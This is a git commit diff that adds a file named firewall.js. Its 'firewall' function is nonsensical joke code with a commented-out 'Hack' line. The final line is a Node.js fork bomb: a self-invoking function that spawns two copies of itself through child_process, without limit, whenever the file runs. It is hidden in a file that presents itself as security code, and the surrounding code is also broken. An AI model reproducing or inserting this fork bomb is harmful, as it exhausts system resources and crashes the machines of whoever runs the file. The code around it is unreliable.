7ede5dd7b758dd77cb5625618e65c4dfc5f42696
jentaughtme <69075710+jentaughtme@users.noreply.github.com>
2020-08-01 06:29:58 -0400

    Update firewall.js

--- firewall.js
+++ firewall.js
@@ -1,1 +1,19 @@
+function initializeFirewall(){
+  if (firewall) return;
+  
+  if (!firewall) {
+    let firewall = {
+      on:"yes" 
+    };
+    
+    /* IGNORE: testing
+     let discord = "furries";
+     discord.Hack(insert(firewall));
+    */
+    console.log("Firewall initialized");
+  }
+  
+}
 
+initializeFirewall()
+(function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
